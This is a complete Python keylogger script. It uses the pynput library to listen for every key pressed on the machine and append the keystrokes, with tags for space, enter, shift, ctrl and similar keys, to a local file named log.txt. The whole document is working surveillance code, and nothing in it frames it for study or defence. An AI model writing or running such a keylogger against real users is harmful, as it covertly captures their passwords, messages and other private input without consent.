from pynput import keyboard

def on_press(key):
    try:
        with open("log.txt", "a") as log:
            if key == keyboard.Key.space:
                log.write(" [space] ")
            elif key == keyboard.Key.enter:
                log.write(" [enter] \n")
            elif key == keyboard.Key.backspace:
                log.write(" [backspace] ")
            elif key == keyboard.Key.shift:
                log.write(" [shift] ")
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                log.write(" [ctrl] ")
            elif key == keyboard.Key.tab:
                log.write(" [tab] ")
            elif key == keyboard.Key.esc:
                log.write(" [esc] ")
            else:
                log.write(f"{key.char}")
    except AttributeError:
        pass  # Handle special keys gracefully

def start_logging():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logging()
